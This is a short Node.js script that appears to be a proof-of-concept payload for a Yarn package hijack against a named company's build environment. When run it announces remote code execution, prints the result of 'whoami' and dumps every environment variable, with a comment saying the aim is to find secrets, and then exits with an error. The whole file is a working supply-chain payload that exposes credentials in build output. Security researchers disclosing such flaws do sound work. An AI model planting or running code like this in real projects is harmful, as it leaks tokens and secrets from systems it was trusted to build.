#!/usr/bin/env node
const { execSync } = require('child_process');

console.log("========================================");
console.log("[!] LAUNCHDARKLY RCE VERIFIED (via Yarn Hijack)");
console.log("[!] Context: " + execSync('whoami').toString().trim());
console.log("[!] Environment Secrets:");
try {
    // Grep for secrets in the environment
    console.log(execSync('env').toString());
} catch (e) {
    console.log("Here is env");
}
console.log("========================================");

process.exit(1);
